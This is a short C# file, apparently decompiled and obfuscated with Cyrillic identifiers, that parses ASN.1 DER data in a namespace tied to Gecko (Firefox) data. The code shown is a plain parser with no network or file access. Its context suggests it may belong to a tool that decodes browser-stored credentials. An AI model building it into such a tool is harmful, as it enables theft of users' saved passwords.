using System;

namespace NoiseMe.Drags.App.Data.Gecko
{
	public static class Апн
	{
		public static нкрпар Create(byte[] dataToParse)
		{
			нкрпар нкрпар = new нкрпар();
			for (int i = 0; i < dataToParse.Length; i++)
			{
				ггорол ггорол = (ггорол)dataToParse[i];
				int num = 0;
				switch (ггорол)
				{
				case ггорол.Sequence:
				{
					byte[] array;
					if (нкрпар.ObjectLength == 0)
					{
						нкрпар.ObjectType = ггорол.Sequence;
						нкрпар.ObjectLength = dataToParse.Length - (i + 2);
						array = new byte[нкрпар.ObjectLength];
					}
					else
					{
						нкрпар.Objects.Add(new нкрпар
						{
							ObjectType = ггорол.Sequence,
							ObjectLength = dataToParse[i + 1]
						});
						array = new byte[dataToParse[i + 1]];
					}
					num = ((array.Length > dataToParse.Length - (i + 2)) ? (dataToParse.Length - (i + 2)) : array.Length);
					Array.Copy(dataToParse, i + 2, array, 0, array.Length);
					нкрпар.Objects.Add(Create(array));
					i = i + 1 + dataToParse[i + 1];
					break;
				}
				case ггорол.Integer:
				{
					нкрпар.Objects.Add(new нкрпар
					{
						ObjectType = ггорол.Integer,
						ObjectLength = dataToParse[i + 1]
					});
					byte[] array = new byte[dataToParse[i + 1]];
					num = ((i + 2 + dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : dataToParse[i + 1]);
					Array.Copy(dataToParse, i + 2, array, 0, num);
					нкрпар.Objects[нкрпар.Objects.Count - 1].ObjectData = array;
					i = i + 1 + нкрпар.Objects[нкрпар.Objects.Count - 1].ObjectLength;
					break;
				}
				case ггорол.OctetString:
				{
					нкрпар.Objects.Add(new нкрпар
					{
						ObjectType = ггорол.OctetString,
						ObjectLength = dataToParse[i + 1]
					});
					byte[] array = new byte[dataToParse[i + 1]];
					num = ((i + 2 + dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : dataToParse[i + 1]);
					Array.Copy(dataToParse, i + 2, array, 0, num);
					нкрпар.Objects[нкрпар.Objects.Count - 1].ObjectData = array;
					i = i + 1 + нкрпар.Objects[нкрпар.Objects.Count - 1].ObjectLength;
					break;
				}
				case ггорол.ObjectIdentifier:
				{
					нкрпар.Objects.Add(new нкрпар
					{
						ObjectType = ггорол.ObjectIdentifier,
						ObjectLength = dataToParse[i + 1]
					});
					byte[] array = new byte[dataToParse[i + 1]];
					num = ((i + 2 + dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : dataToParse[i + 1]);
					Array.Copy(dataToParse, i + 2, array, 0, num);
					нкрпар.Objects[нкрпар.Objects.Count - 1].ObjectData = array;
					i = i + 1 + нкрпар.Objects[нкрпар.Objects.Count - 1].ObjectLength;
					break;
				}
				}
			}
			return нкрпар;
		}
	}
}
